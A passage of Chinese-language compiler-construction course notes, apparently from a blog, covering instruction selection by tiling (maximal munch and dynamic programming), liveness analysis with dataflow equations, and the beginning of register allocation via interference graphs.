就任务完成了。<br>X86的例子：<br><img src="/compiler-construction-principles/tiling.png" alt="x86 tiling example" loading="lazy"><br>Jouette的例子，其中<code>a</code>数组每个元素占据4个储存地址，因此要翻译的IR指令是<code>M[a+i*4]:=x</code>：<br><img src="/compiler-construction-principles/jouette-tiling.png" alt="jouette tiling example" loading="lazy"></li></ul></li></ul></li></ul><p>现在要做的是找到一种方法，使得生成的机器代码跑的比香港记者还快。<br><strong>注：以下讨论隐含的前提是每个指令速度一致。但是对于RISC指令集（见下一节）来说并非如此，有的指令可能耗费高达数十时钟周期。好消息是<code>Jouette</code>指令集不仅单发射还固定延迟，所以指令少即是跑得快。</strong></p><p>每个Tile对应一个代价(cost), 反应了生成的目标机器指令运行的代价（功耗&#x2F;延迟&#x2F;速度……取决于你）。</p><ul><li>可以用很多小的tile轻松覆盖整棵树，但是大量tile对应大量目标代码，很长很慢；</li><li>也可以用一些大块的tile进行覆盖，这样tile量少对应目标代码也较小，跑得快（但是这使得覆盖问题本身变得困难）。</li></ul><p>为此我们需要区分如下两个概念：</p><ul><li>Optimum tiling<ul><li>全局最优：所有tiles总代价最小</li></ul></li><li>Optimal tiling<ul><li>局部最优：没有相邻的tile可以被合并成一个tile了</li></ul></li></ul><p>显然全局最优一定局部最优，但反之则不然。</p><p>接下来就是不同的指令选择算法（<strong>划重点！</strong>）：</p><ul><li><strong>Maximal Munch</strong>: 寻找optimal tiling (<strong>局部最优的</strong>)<ul><li><strong>自顶向下</strong></li><li>用可用的最大tile覆盖当前节点</li><li>递归地对（那些根节点）还未被覆盖的每个子树应用该算法</li><li>把所有tile对应的指令按照覆盖顺序的<strong>逆序</strong>收集起来即为目标机器码<ul><li>为何逆序？考虑一个简单的<code>BINOP(PLUS, 1, 5)</code>, 该算法会先用加法指令对应的tile覆盖，然后再对操作数表达式（<code>1</code>和<code>5</code>）递归生成对应的tile. 但显然要先有操作数表达式的值，才能对他们执行加法指令。</li></ul></li><li>运用贪心思想：更大的tile&#x3D;&gt;更精确的模式匹配&#x3D;&gt;更多指令中的信息被运用&#x3D;&gt;更优的代码</li></ul></li><li><strong>动态规划(dynamic programming, DP)</strong>: optimum tiling (<strong>全局最优的</strong>)<ul><li><p><strong>自底向上</strong></p></li><li><p>每个节点<code>x</code>都有一个代价，是代价最小的覆盖方案的代价。<br>而每个可用于覆盖节点<code>x</code>的tile都对应一种方案，该方案的代价为该tile的子树代价之和，加上这个tile <code>T</code>固有的代价：<br>$ cost(x)&#x3D;\underset{\forall \text{tile } T \text{ that can cover node } x}{min} (cost_T + \underset{\forall \text{child } y \text{ of tile } T}{\sum} cost(y)) $<br>例如，假设<code>ADD</code>指令对应两种tile,</p><ul><li>第一种，对应最原始的模式<code>BINOP(PLUS, _expr1_, _expr2_)</code>，如果使用这个 tile, 该节点的代价自然就是<code>表达式1（左子树）的代价+表达式2（右子树）的代价+1</code>;</li><li>第二种，操作数都是常数可以直接优化为常值，对应模式为<code>BINOP(PLUS, CONST(num), CONST(num))</code>，那么以该节点为根的子树立刻被完全覆盖，该节点代价就是固定值<code>1</code> !</li></ul><p>如果这两种tile都可用的话，显然应该选择第二种。</p></li><li><p>tile 的子树的代价均已知，在可用于覆盖当前节点的tiles中，采用一个使得该节点代价最小的进行覆盖即可。</p></li><li><p>正确性：使得某节点代价最小的 tile, 其子树必然也以代价最小的tile覆盖。否则子树可以替换为更优的覆盖方式，结果一定不会更劣。</p></li><li><p>时间复杂度：线性（因为可用 tile 数与IR Tree节点数量都是已知常数）。</p></li><li><p>步骤：</p><ol><li>自底向上，递归地求出所有子树的代价</li><li>尝试所有在当前节点可用的tile, 每种tile对应一个覆盖方案</li><li>找到代价最低的一个方案，记录所用的 tile 和代价在该节点上</li><li>根节点的最小代价被找到，意味着整棵树的optimum tiling已完成，开始指令发射(instruction emission).<br>也就是从根节点开始，递归地，先发射该节点 tile 子树的指令，而后发射该节点 tile 的指令。<br>例如：<ol><li>寻找<code>CONST 1</code>与<code>CONST 2</code>的最小代价与tile（略）</li><li>寻找<code>+</code>的最小代价与 tile, 方案2被采用：<br><img src="/compiler-construction-principles/dp-plus-node.png" alt="dp-plus-node" loading="lazy"></li><li>寻找<code>MEM</code>的最小代价与 tile, 方案3被采用：<br><img src="/compiler-construction-principles/dp-mem-node.png" alt="dp-mem-node" loading="lazy"></li><li>发射指令：<br><img src="/compiler-construction-principles/dp-emit.png" alt="dp-emit" loading="lazy"></li></ol></li></ol></li></ul></li></ul><blockquote><p>这里需要特别注意：tile 的子树不是指该节点的子树，而是用 tile 覆盖该节点以及部分子节点后，那些没被覆盖到的子树。<br>例如下图中红色的 tile 对应的子树并非两个<code>MEM</code>子树（因为被这个tile覆盖在内），而是两个<code>PLUS</code>子树：<br><img src="/compiler-construction-principles/tile-children.png" alt="children of tile" loading="lazy"></p></blockquote><h3 id="树语法Tree-Grammar"><a href="#树语法Tree-Grammar" class="headerlink" title="*树语法Tree Grammar"></a>*树语法Tree Grammar</h3><p><strong>不要求掌握。</strong></p><p>tree grammar 是一种上下文无关文法。<br>可以用 tree grammar 描述这些 tile.</p><p>需要记录：</p><ul><li>pattern: 模式是什么样的</li><li>replacement: 这个pattern被替换之后，原来的位置要用什么代替（比如一个加法指令被替换后，要用加法结果所在的寄存器替换该表达式）</li><li>cost: tile 的固有代价</li><li>template: 生成的目标代码模板</li></ul><table><thead><tr><th>pattern-&gt;replacement</th><th>cost</th><th>template</th></tr></thead><tbody><tr><td>+(r1,r2) -&gt; r2</td><td>1</td><td>add r1,r2</td></tr><tr><td>store(r1,load(r2)) -&gt; DONE</td><td>5</td><td>movem r2,r1</td></tr></tbody></table><h3 id="CISC-vs-RISC"><a href="#CISC-vs-RISC" class="headerlink" title="CISC vs. RISC"></a>CISC vs. RISC</h3><ul><li>CISC<ul><li>Complex Instruction Set Computer &#x3D; 复杂指令集计算机</li><li>可能有多个寄存器类，有的指令只能使用一部分</li><li>指令不等长</li><li>计算指令可用内存作为操作数</li><li>内存寻址方式多样</li><li>指令可能有副作用</li><li>…</li><li>难以使用tree pattern-based tiling建模！</li></ul></li><li>RISC<ul><li>Reduced Instruction Set Computer &#x3D; 精简指令集计算机</li><li>寄存器只有一类</li><li>指令等长（例如32bit）</li><li>计算指令只能用寄存器作为操作数</li><li>内存寻址方式少</li><li>指令没有副作用（WYSIWYG）</li><li>…</li></ul></li></ul><p>CISC 引入了一些问题：</p><ul><li>较少的寄存器：用一些临时节点代替，让寄存器分配器干活</li><li>要求操作数&#x2F;结果放在不同寄存器：多显式 move 即可</li><li>使用2地址码，但IR是3地址码：<code>t1&lt;-t2+t3</code>可转为<code>t1&lt;-t2; t1&lt;-t1+t3;</code>. 然后让寄存器分配器干活</li><li>操作数使用了内存值：先放进寄存器即可</li><li>有副作用（比如某种自增计数器）：无视&#x2F;改写&#x2F;换一套算法然后改用DAG模式匹配……</li></ul><p>对于CISC, IR Tree中的多个指令可能只需要一个机器指令就能解决，此时 optimal 和 optimum 区别巨大；<br>对于RISC, 很多时候二者没有什么区别，因此只需要最简单的 tiling 算法。</p><p>现代编译器还需要额外考虑以下问题：</p><ul><li>多级流水中指令可以同时发射执行，因此多指令的执行时间并非简单加和即可</li><li>cost只是一种不错的估计，而不能反应全貌。<ul><li>例如，指令顺序可能影响流水线的 stall 频率从而影响 CPU 的 IPC, 指令间复杂的羁绊显然无法通过cost这一简单数字反应……</li></ul></li></ul><h2 id="Part-16-活跃变量分析"><a href="#Part-16-活跃变量分析" class="headerlink" title="Part 16: 活跃变量分析"></a>Part 16: 活跃变量分析</h2><h3 id="编译器优化"><a href="#编译器优化" class="headerlink" title="*编译器优化"></a>*编译器优化</h3><p><strong>不要求掌握。</strong></p><p>例如GCC的 <code>-O</code> 系列编译选项。</p><p>优化可以分为：</p><ul><li>空间优化</li><li>时间优化</li><li>能耗优化</li></ul><p>优化可以是：</p><ul><li>本地的：一个basic block里</li><li>全局的（过程内）：在整个过程（函数&#x2F;方法）中</li><li>全程序的（跨过程）：多个过程（函数&#x2F;方法）之间，甚至整个程序，甚至多个通过链接器连接起来的源程序间（参见LTO, link time optimization）</li></ul><p>常见优化（闲的话可以在lab里实现一下）：</p><ul><li>编译期常量求值：常量折叠、常量传播</li><li>减少计算代价：代数简化、强度折减(strength reduction)</li><li>消除重复计算：拷贝传播、值编号、消除公因子</li><li>向量化：超字级并行(superword-level parallelism, SLP)、循环向量化</li><li>循环优化：循环不变代码外提、循环展开、合并拆分、代码提升(code hoisting)</li><li>减少函数调用开销：内联、尾递归优化</li><li>控制流优化：死代码消除、if语句简化</li></ul><p>这些优化需要一些对代码的分析：</p><ul><li>控制流分析：基本块之间的跳转关系<ul><li>例如：死代码消除</li></ul></li><li>数据流分析：数据依赖、引用关系，活跃情况<ul><li>例如：向量化</li></ul></li><li>别名分析：寻找可能指向同一地址的指针</li></ul><h3 id="数据流分析Dataflow-Analysis"><a href="#数据流分析Dataflow-Analysis" class="headerlink" title="数据流分析Dataflow Analysis"></a>数据流分析Dataflow Analysis</h3><ul><li>CFG &#x3D; Control-Flow Graph<ul><li>节点代表一个语句<ul><li>一般来说，我们会将多个相邻的不包含跳转指令，也不是跳转指令目的地的多个语句组合为一个基本块</li></ul></li><li>有向边代表一个可能的跳转</li></ul></li></ul><p>我们可以从CFG（或其他类型的中间表示）中<strong>静态（i.e. 不需要真的运行程序）</strong>推导出一些程序的行为信息。<br>这其中就包括马上要研究的话题：<strong>变量的活跃性</strong>。</p><h3 id="活跃性分析Liveness-Analysis"><a href="#活跃性分析Liveness-Analysis" class="headerlink" title="活跃性分析Liveness Analysis"></a>活跃性分析Liveness Analysis</h3><p>定义变量的liveness: 我们说变量<code>x</code>在执行到一个语句<code>s</code>时是活跃(live)的，当且仅当：</p><ul><li>存在某个语句<code>s&#39;</code>使用了<code>x</code></li><li>存在一个执行路径，能从<code>s</code>执行到<code>s&#39;</code></li><li>在某个这样的路径上，<code>x</code>没有被重新赋值&#x2F;定义过</li></ul><p><strong>简单粗暴的理解：活跃变量&#x3D;还有用的变量，需要留着备用；不活跃变量&#x3D;没有用的变量&#x3D;死变量，不再使用，对应的寄存器可以释放。</strong></p><p>为什么要进行活跃性分析呢？因为从Low level IR到机器码的翻译过程中，需要把有限但很多的抽象寄存器对应到物理寄存器上，也就是<strong>寄存器分配</strong>。<br>如果能识别不需要使用的变量（i.e. 不活跃变量），那么其对应的虚拟&#x2F;物理寄存器就可以被释放，再次用于分配。</p><blockquote><p>可以把活跃变量分析理解为一种特殊的生命周期分析，只不过除了显式的变量，还要考虑那些中间值，统称 temporaries.<br>temporaries 其实经常指的就是 IR 中的那些虚拟寄存器。</p></blockquote><p>活跃性分析用途：</p><ul><li><p>指导&#x2F;优化寄存器分配，减少寄存器使用<br>例如对于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1: a = 1; // a lives in out[1]-&gt;in[2]</span><br><span class="line">2: b = a + 2; // b lives in out[2]-&gt;in[3]</span><br><span class="line">3: c = b + 3; // c lives in out[3]-&gt;in[4]</span><br><span class="line">4: return c;</span><br></pre></td></tr></table></figure><p>我们会发现他们的 <strong>活跃区间(live range)</strong> 并不重叠，可以映射到同一个物理寄存器<code>r</code>，并据此重写代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r=1;</span><br><span class="line">r=r+2;</span><br><span class="line">r=r+3;</span><br><span class="line">return r;</span><br></pre></td></tr></table></figure></li><li><p>消除多余代码：例如删去未被使用的变量</p></li><li><p>优化 IR 生成</p></li><li><p>提高安全性：检查未初始化的变量</p></li><li><p>…</p></li></ul><h3 id="活跃性分析：数据流方程"><a href="#活跃性分析：数据流方程" class="headerlink" title="活跃性分析：数据流方程"></a>活跃性分析：数据流方程</h3><p>首先要明确一点：不可能精确知道一个变量在某处是否活跃，所以我们要做的只是<strong>保守估计</strong>（i.e. 标记为不活跃的变量一定不活跃，但反之则不然）。<br>这是因为对于代码片段<code>int x=10; f(); return x;</code>:<br>如果能判断x是否在定义并初始化<strong>之后</strong>依旧活跃，就等于能判断<code>f()</code>是否停机。而众所周知停机问题不可判定，so sad.</p><p>在本节中，我们需要分析的是活跃变量。<br>而变量在CFG上，通过有向边“流向”各个节点。<br>所以我们将通过数据流分析，找到每个节点可能会有哪些变量“流过”；换言之，找到每个节点可能会有哪些变量在其上是活跃的。</p><p>一些CFG上的术语定义（可能很抽象，往后看就行）：</p><ul><li>node&#x2F;节点：在本文中均指只包含一个语句的</li><li>out-edges: 出边，指向后继节点</li><li>in-edges: 入边，来自前驱节点</li><li>pred[n]: 节点<code>n</code>的前驱节点<strong>们</strong></li><li>succ[n]: 节点<code>n</code>的后继节点<strong>们</strong></li><li>fact: 从CFG中能推断出的一些结论&#x2F;信息&#x2F;事实，这些结论是“绑定”在有向边上的<ul><li>例如现在要研究的 <strong>变量活跃性(liveness)</strong> 就是一个fact.</li><li>变量是否活跃这一信息是通过这些有向边传递的。</li></ul></li><li>in[n]: 一个集合，包含节点<code>n</code>的入边(in-edges)上的所有facts<ul><li>对于本节来说，我们要求的是变量的liveness, 所以为在节点<code>n</code>内 live-in(定义见下文) 的变量。<ul><li>也就是 the live-in set of node <code>n</code></li><li>也就是 the variables that are live-in at node <code>n</code></li><li><strong>可以简单理解为：在节点<code>n</code>中的语句执行后，哪些变量处于活跃状态，有可能在未来被用到。</strong></li></ul></li><li>稍后会详细解释该集合的含义，以及如何计算它。</li></ul></li><li>out[n]: 一个集合，包含节点<code>n</code>的出边(out-edges)上的所有facts<ul><li>对于本节来说，我们要求的是变量的liveness, 所以为在节点<code>n</code>内 live-out(定义见下文) 的变量。<ul><li>也就是 the live-out set of node <code>n</code></li><li>也就是 the variables that are live-out at node <code>n</code></li><li><strong>可以简单理解为：在节点<code>n</code>中的代码执行前，哪些变量处于活跃状态，有可能在当前节点<code>n</code>或未来被用到。</strong></li></ul></li><li>稍后会详细解释该集合的含义，以及如何计算它。</li></ul></li><li>transfer function: 一个函数，定义一个节点上的信息如何通过传递给另一个节点<ul><li>比如稍后会得到的两个in&#x2F;out的方程（等式）</li></ul></li><li>use: 如果一个语句的右侧(RHS)出现了变量<code>x</code>, 我们说这个语句use了<code>x</code><ul><li>这意味着变量<code>x</code>中储存的值被使用了，引入了一个数据依赖。</li></ul></li><li>use of a variable <code>x</code>: 所有use了<code>x</code>的节点集合</li><li>define: 对<code>x</code>赋值即为define了<code>x</code><ul><li>注意：这里的 IR 没有类似 C 语言变量定义的语句，而初次赋值其实就是一种“变量定义”，或者叫 define。</li><li>为何<strong>后续</strong>再次对<code>x</code>赋值也是define？这是因为我们如果以一种比较函数式的视角来看，我们并非是“把值<code>val</code>储存到<code>x</code>中”，<strong>而是将“名字<code>x</code>绑定到值<code>val</code>上”</strong>。<br>这不难理解：我们关心的是数据之间的依赖性（数据流），<code>x</code>只是对某个值的一个指代&#x2F;一个记号&#x2F;一个名字。<br><code>x=1; x=x+1; return x;</code> 与 <code>x=1; y=x+1; return y;</code> 是完全等价的。<br>也就是说，每次对<code>x</code>的赋值都是一个“重绑定”：<strong>原来的旧<code>x</code>已经死了，新的<code>x</code>只是恰好名字也叫<code>x</code>, 但它已经是全新的一个变量了</strong>。</li></ul></li><li>def of a variable <code>x</code>: 所有define了<code>x</code>的节点集合</li><li>def of a node <code>N</code>: 节点<code>N</code>定义的变量集合</li><li><code>x</code> is <strong>live on an edge</strong>: 存在一条以这条有向边(edge)开始的路径，终点指向一个use of <code>x</code>, 且中间经过的节点不包含任何def of <code>x</code><ul><li>这意味着：<code>x</code>可能在之后被使用；而且在被使用前没有被重定义&#x2F;赋值过（这表明数据确实可能存在依赖：那个 use 必须真的使用现在这个<code>x</code>储存的值）。</li></ul></li><li><strong>live-in</strong>: 如果<code>x</code> live on 节点的<strong>任意一个</strong>入边，那么我们说<code>x</code> live-in 该节点</li><li><strong>live-out</strong>: 如果<code>x</code> live on 节点的<strong>任意一个</strong>出边，那么我们说<code>x</code> live-out 该节点</li></ul><blockquote><p>可以把每个节点<code>n</code>理解为一个工厂，<code>in[n]</code>是工厂需要购买的材料，<code>out[n]</code>是工厂需要提供的材料。<br>工厂有时会自己生产新的材料给下游使用（<code>def[n]</code>），有时会消耗上游提供的材料（<code>use[n]</code>），其他时候可能只是把上游的材料原封不动地转交给下游工厂（<code>in[n]</code>和<code>out[n]</code>的交集*）</p><p>*严格来说不考虑重绑定，或者说静态单赋值的情况下是<code>in[n]</code>和<code>out[n]</code>的交集。<br>如果有重绑定就会有重名的情况：比如对于下图中的节点 3, 由于该节点进行了赋值操作（define）， <code>in[3]</code>中的<code>c</code>和<code>out[3]</code>中的<code>c</code>看似在交集中，但其实值已经被改变，已经是两个不同的变量了，只是“恰好”名字一样。</p></blockquote><p><a name="cfg-example"></a></p><p><img src="/compiler-construction-principles/cfg-example.png" alt="cfg example" loading="lazy"><br>例如对于上图：</p><ul><li>如下信息可以直接获得：<ul><li>5的出边有2条，分别指向2和6</li><li>4只有一条入边，来自3</li><li>pred[3]&#x3D;{2}</li><li>succ[5]&#x3D;{2, 6}</li><li>def(a)&#x3D;{1, 4}</li><li>use(a)&#x3D;{2, 5}</li><li>def(3)&#x3D;{c}</li><li>use(3)&#x3D;{b, c}</li></ul></li><li>如下信息蕴含在图中，但无法直接获得，需要进一步求解：<ul><li>in[1]&#x3D;{c}, out[2]&#x3D;{a, c}</li><li>in[2]&#x3D;{a, c}, out[2]&#x3D;{b, c}</li><li>in[6]&#x3D;{c}, out[6]&#x3D;{}</li></ul></li></ul><p>记住：CFG 中的一个结点是一段代码，但是为了方便起见我们都假设只有一个语句在里面。所以其实你可以很简单地合并一串连续的代码（变成基本块）。<strong>我们说“执行某个节点”，指的就是执行节点里的代码。</strong></p><p>接下来的重点就是找到一种方式计算in&#x2F;out集合。<br>事实上可以迭代地不断计算、更新<code>in[n]</code>以及<code>out[n]</code>, 直到他们在某次迭代后不再改变变（i.e. 到达了这个算法的<em>不动点</em>）。</p><p>要计算 in[n] 与 out[n], 需要用到以下几个规则(rule)：</p><ol><li>If $ a \in in[n] $, then $ \forall m \in pred[n], a \in out[m] $<ul><li>解释：每个前驱节点都可能是在该节点执行前的节点（我们在静态分析，无法确定到底是从何处执行到<code>n</code>的）。<br>如果某个节点<code>n</code>要求执行前<code>a</code>是活跃的，我们想要确保无论是从<code>pred[n]</code>中的哪个前驱节点跳转而来，前驱节点执行完毕时<code>a</code>都是活跃的（因为我们在做保守估计）。</li></ul></li><li>If $ a \in use[n] $, then $ a \in in[n] $<ul><li>解释：如果某个节点<code>n</code>直接使用了变量<code>a</code>, 那当然要求<code>a</code>在节点执行前是活跃的。</li></ul></li><li>If $ a \in out[n] $ and $ a \notin def[n] $ , then $ a \in in[n] $<ul><li>解释：如果现在已知某个变量<code>a</code>必须在节点<code>n</code>执行完毕时活跃，但是<code>n</code>自己并没有定义<code>a</code>, 那显然<code>a</code>是从之前的前驱节点继承而来。<br>因此，要求<code>a</code>在节点<code>n</code>执行之前就是活跃的。</li></ul></li></ol><p>从这些规则可以导出如下两个方程（等式），<strong>可直接用于迭代计算并更新 in[n] 与 out[n]</strong> 这两个<strong>集合</strong>:</p><ul><li>$ in[n] &#x3D; use[n] \cup (out[n]-def[n]) $<ul><li>解释：节点<code>n</code>需要向前驱节点索取的活跃变量包括自己需要使用的<code>use</code> 并上后续别的节点需要使用的<code>out</code>. 不过如果节点自己定义了一些变量，则不需要向前驱节点索要，所以挖去<code>def</code></li></ul></li><li>$ out[n] &#x3D; \underset{s \in succ[n]}{\cup} in[s] $<ul><li>解释：后继节点要什么就给什么，后继节点的总需求就是该节点<code>n</code>需要供给的活跃变量。</li></ul></li></ul><h3 id="解方程-equations"><a href="#解方程-equations" class="headerlink" title="解方程(equations)"></a>解方程(equations)</h3><p>应用这两个方程可以给出如下算法求解出in&#x2F;out：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">for each n</span><br><span class="line">  // init. to empty sets, which is a very rough approximation:</span><br><span class="line">  in[n] ←&#123;&#125;; out[n] ←&#123;&#125; </span><br><span class="line">repeat:</span><br><span class="line">  for each n</span><br><span class="line">    in&#x27;[n] ← in[n]; out&#x27;[n] ← out[n]</span><br><span class="line">    </span><br><span class="line">    // `⋃` stands for &quot;union&quot;</span><br><span class="line"></span><br><span class="line">    // use/def is easy to obtain at the very beginning</span><br><span class="line">    in[n] ← use[n] ⋃ (out[n] − def[n]) </span><br><span class="line"></span><br><span class="line">    out[n] ← ⋃&#123; in[s], where s in succ[n] &#125;</span><br><span class="line"></span><br><span class="line">until in&#x27;[n] = in[n] and out&#x27;[n] = out[n] for all n </span><br><span class="line">// i.e. until no update can be made</span><br></pre></td></tr></table></figure><p>每次迭代中集合总会<strong>单调地</strong>变大。<br>对于刚刚的<a href="#cfg-example">这个 CFG</a>, 其求解流程如下，在7步后收敛：<br><img src="/compiler-construction-principles/calc-liveness-forward.png" alt="calc-liveness-forward" loading="lazy"></p><p>似乎每一步能更新的很少。但事实上<strong>想要加速收敛的技巧就藏在<code>for each n</code>这一句中：只需要反转一下每次迭代遍历节点的顺序即可</strong>！</p><p>我们原先是顺着CFG中的有向边方向进行更新（1-&gt;6, in-&gt;out）。<br>然而考虑信息在节点间的传递是通过 $ out[n] &#x3D; \underset{s \in succ[n]}{\cup} in[s] $ 完成的，其方向是从后向前的。<br>所以我们可以在每次迭代中，都按照<strong>逆序</strong>（6-&gt;1, out-&gt;in）进行计算：<br><img src="/compiler-construction-principles/calc-liveness-backward.png" alt="calc-liveness-backward" loading="lazy"></p><p>只需要 3 次迭代就收敛。</p><blockquote><p>本质上，liveness问题是“需求决定供给”的：后续的节点有对变量的使用需求，之前的节点才可能需要提供一个活跃的变量。<br>liveness 就是一种 fact.<br>迭代更新顺序也应遵循这些 facts 的流动方向。而在活跃性分析中，liveness 反向流过这些 CFG 的有向边，并且是先影响 out 再进而影响 in.<br>因此我们迭代的过程也要遵从这一规律，使得一次迭代中，某一个 use 引入的需求能够迅速传遍整个 CFG, 而非每次只影响附近的个别结点，</p><p>关于迭代方向的重要性，可以类比一下冒泡排序：如果现有数组<code>2 3 4 5 6 7 1</code>需要排序，那么可以看出<code>1</code>自然的流动方向就是从右到左。<br>冒泡排序每次迭代会按顺序检查相邻的数字并交换逆序对。<br>如果从右到左，第一次迭代就可以完成排序：<code>1</code>连续被交换，迅速“上浮”至第一的位置；<br>如果非要从左到右，那么每次迭代<code>1</code>都只能被交换一次，上浮一位，需要多达6次迭代才能完成！</p></blockquote><p>最终， <strong><code>out[n]</code>会被用于寄存器分配</strong>：毕竟最终要决定的是<strong>执行语句之后需要保留哪些变量</strong> （供给侧）。</p><h3 id="活跃性分析杂项"><a href="#活跃性分析杂项" class="headerlink" title="活跃性分析杂项"></a>活跃性分析杂项</h3><ul><li>把多个相邻的节点尽可能合并为基本块可以加速。</li><li>根据变量多少，视具体情况用 bitmap 或有序列表等方式储存集合可以更快。</li><li>实践中也可以每次专门求解某一变量<code>x</code>的数据流（in&#x2F;out），因为大部分中间临时值的 live range 很短。</li><li>这一算法最差的时间复杂度可能为 $ \Omega (N^4)$, 其中N为节点个数。好在这一上界很难达到……</li><li>算法求解的是“最小不动点”：极端情况下，你当然可以让所有变量都是live的，这也是个不动点，但不是我们想要的。</li><li>进一步优化算法：可以用队列记录有可能需要被进一步更新的节点（类似BFS）。</li><li>变量活跃性可以分为：<ul><li>动态的dynamic liveness: 运行时判断，显然是一种under-approximation, 因为不能覆盖所有可能执行路径。</li><li>静态的static liveness: 像刚刚做的一样在编译期判断，显然是一种over-approximation, 因为估计得很保守，而事实上有些路径不可能被执行到。</li></ul></li></ul><h2 id="Part-17-寄存器分配"><a href="#Part-17-寄存器分配" class="headerlink" title="Part 17: 寄存器分配"></a>Part 17: 寄存器分配</h2><p>我们当然希望一切储存访问都尽可能通过寄存器完成，因为寄存器的速度远快于内存的速度。<br>之前，在 IR 中可以有任意多的虚拟寄存器，但我们在物理架构上不可能有任意多的寄存器。<br>因此他们中的一些势必要被移动到内存中。</p><p><strong>寄存器分配算法的任务：</strong></p><ul><li>将 IR 中大量的虚拟寄存器（储存变量或者运算的中间临时结果，<strong>统称 temporaries</strong>）分配到固定数量的 k 个物理寄存器上，保证代码使用不超过 k 个寄存器</li><li>使得内存访问、储存尽可能少</li><li>使得内存上用于储存 spilled 值的空间尽可能小</li><li>算法需要尽可能高效<ul><li>典型的复杂度：O(n) 或 O(nlogn)</li></ul></li></ul><p>在工程实践中，算法的实现大致分为两种：</p><ul><li><strong>图染色：</strong> 效果好，但是慢<ul><li>“传统派”：GCC等采用</li></ul></li><li><strong>线性扫描：</strong> 效果也很好，接近图染色的效果；运行速度快<ul><li>“维新派”：LLVM等采用</li></ul></li></ul><p>不同的分配策略：</p><ul><li>Naïve register allocation: 变量（广义的变量，也就是虚拟寄存器储存的 temporaries）一股脑全塞内存里！</li><li>局部寄存器分配：在 basic block 里进行，无法应对跨越多个块的对寄存器的复用。</li><li>全局寄存器分配：在函数内进行，经常基于<strong>图染色</strong>：<ol><li>建立一个<strong>干扰图&#x2F;相交图</strong> 。<ul><li>这是一个无向图，每个边都代表两端的 temporary 同时存在过，不能被分配到同一个寄存器里。我们马上会详细阐述。</li></ul></li><li>对于 k 个<strong>物理</strong>寄存器，找到这个图的 k-coloring(k染色)：也就是边连接的相邻节点不被染为同一个颜色的情况下，用 k 种颜色染色所有节点。<ul><li>如果染色成功：每种颜色对应一个物理寄存器，分配完成</li><li>如果染色失败：说明这个图<strong>并非 k-colorable</strong>，需要修改代码(原文：change the code to a nearby)。<ul><li>会在后文详细阐述。</li></ul></li></ul></li></ol></li></ul><h3 id="干扰图Interference-Graph"><a href="#干扰图Interference-Graph" class="headerlink" title="干扰图Interference Graph"></a>干扰图Interference Graph</h3><p>相交图 &#x3D; 干扰图 &#x3D; interference graph &#x3D; conflict graph</p><ul><li><p>如果两个虚拟寄存器<code>a</code>和<code>b</code>因为某种约束限制，使得它们<strong>无法被分配到同一个物理寄存器中</strong>，我们就说<code>a</code>与<code>b</code>之间存在 <strong>干扰(interference)</strong> ，或者说他们”interfere”。<br>这些约束包括但不限于：</p><ul><li>live range 有重叠（<strong>最主要的原因！</strong>）：某个时刻<code>a</code>和<code>b</code>都是活跃的，值需要得到保留，我们自然无法在同一个寄存器中同时保存<code>a</code>和<code>b</code>；</li><li>产出&#x2F;使用<code>a</code>这个值的指令比较特殊，不能使用某些特定寄存器（比如<code>r1</code>），那么<code>a</code>和<code>r1</code>也 interfere 了。<ul><li>读者可能会疑惑<code>r1</code>不是物理寄存器吗？其实我们不用太纠结这个：最终都是为了让图染色算法能够“感知”到有这样一个约束存在，所以大可以把物理寄存器添加到虚拟寄存器中，图只要改一改就行。<br>说到底，现在要<strong>禁止<code>a</code>染上<code>r1</code>对应的颜色</strong>：<br>试图 ban 掉某种颜色：可以在一开始就把 k 个物理寄存器加入图中，对应 k 个节点 <code>r1</code> <code>r2</code> … <code>rk</code>, 并在他们之间建立全连接（<strong>注意！更高效的做法参见后文 <em>预染色</em> 部分</strong>），<br>这将强迫图染色器为他们分配 k 种不同的颜色。<br>建立干涉图的过程中，如果<code>a</code>和<code>r1</code> interfere 了，只需要在图中连接<code>a</code>与对应的节点<code>r1</code>即可。<br><img src="/compiler-construction-principles/physical-interference.png" alt="physical interference" loading="lazy"></li></ul></li></ul></li><li><p>节点：一个节点就是 IR 中的一个虚拟寄存器，或者说一个 temporary.</p></li><li><p>无向边：一条边代表一个 interference, 边连接的两个节点<strong>不能</strong>被分配到同一个物理寄存器。</p></li><li><p>建图步骤：基本上就是<strong>在同时存在的变量之间连边</strong>。在变量<code>t</code>被定义（赋值也是定义）时，把它和所有其他的、当前活跃(live)的变量<code>vi</code>连边 (<code>b</code>, <code>vi</code>) 即可：<br>例如对于如下程序：</p><table><thead><tr><th>Inst.</th><th>Live vars</th><th>Operation</th></tr></thead><tbody><tr><td></td><td>a</td><td>-</td></tr><tr><td>b&#x3D;a+2</td><td></td><td></td></tr><tr><td></td><td>a, b</td><td>link b-a</td></tr><tr><td>c&#x3D;b*b</td><td></td><td></td></tr><tr><td></td><td>a, c</td><td>link c-a</td></tr><tr><td>b&#x3D;c+1</td><td></td><td></td></tr><tr><td></td><td>a, b</td><td>link b-a (duplicated)</td></tr><tr><td>return b*a</td><td></td><td></td></tr></tbody></table><p>最终得到：<br><img src="/compiler-construction-principles/int-graph-abc.png" alt="interference graph example" loading="lazy"></p><ul><li><p>需要特别处理（或者说优化）涉及<code>MOVE</code>指令的情况：<br>如果通过<code>MOVE</code>执行了<code>t:=s</code>这样的移动操作，由于<code>MOVE</code>后<code>t</code>和<code>s</code>储存的值是相同的，其实暂时可以不添加 <code>(s, t)</code> 这条边，而是采用同一寄存器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">t := s (MOVE)</span><br><span class="line">...</span><br><span class="line">x := ... s ... (use of `s`)</span><br><span 